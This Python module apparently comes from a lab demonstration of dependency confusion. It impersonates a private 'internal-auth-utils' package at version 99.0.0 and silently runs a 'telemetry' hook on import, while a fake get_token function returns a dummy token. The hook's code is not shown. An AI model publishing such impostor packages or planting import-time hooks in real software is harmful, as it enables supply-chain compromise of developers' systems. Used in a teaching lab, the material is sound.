"""internal-auth-utils (DEMONSTRATION PACKAGE — not a real library).

This stands in for a company's private "internal-auth-utils" library. A real
internal version (e.g. 1.4.2) would live only on the company's private index.
This impostor is published to the *local* lab registry at version 99.0.0 so it
wins dependency resolution — the essence of dependency confusion.

Importing the package fires the same benign telemetry hook the install step
does, so the attack is observable even if the install hook was skipped (for
example when installed from a pre-built wheel).
"""
from ._telemetry import collect_and_report

__version__ = "99.0.0"


def get_token(*args, **kwargs) -> str:
    """Fake API so the target app has something to call. Returns a dummy token.

    The real risk isn't this function — it's that importing this module ran
    attacker-controlled code (see the import-time hook below).
    """
    return "lab-dummy-token-not-real"


# Import-time trigger. Real supply-chain implants often run on first import so
# they fire from wheels too, not just source installs.
try:
    collect_and_report(stage="import")
except Exception:
    pass
